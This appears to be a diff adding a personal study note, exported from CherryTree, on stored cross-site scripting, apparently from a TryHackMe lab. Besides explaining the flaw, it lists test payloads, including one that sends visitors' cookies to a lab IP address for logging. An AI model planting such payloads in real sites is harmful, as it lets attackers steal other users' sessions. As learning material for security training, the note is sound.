@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>Stored</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>Stored</h1><br/>Stored cross-site scripting is the most dangerous type of XSS. This is where a malicious string originates from the websites database. This often happens when a website allows user input that is not sanitised (remove the &quot;bad parts&quot; of a users input) when inserted into the database.  <br /><br />An example<br />	A attacker creates a payload in a field when signing up to a website that is stored in the websites database. If the website doesn&#39;t properly sanitise that field, when the site displays that field on the page, it will execute the payload to everyone who visits it.<br />	The payload could be as simple as &lt;script&gt;alert(1)&lt;/script&gt;<br />	However, this payload wont just execute in your browser but any other browsers that display the malicious data inserted into the database.<br /><br /><br />&lt;i&gt;test&lt;/i&gt;	<br />#If your text is italisized you are injecting code via html tagging.<br />&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br />&lt;script&gt;document.getElementById(&#39;thm-title&#39;).innerHTML=&quot;test&quot;;&lt;/script&gt;<br />#Same thing<br />&lt;script&gt;window.location=&#39;http://10.10.192.39/log/&#39;+document.cookie&lt;/script&gt;<br />#This will send the cookie of whoever loads the page to <a href="http://10.10.192.39/log/.">http://10.10.192.39/log/.</a> I could not make this call my webserver.<br /></div></body></html>
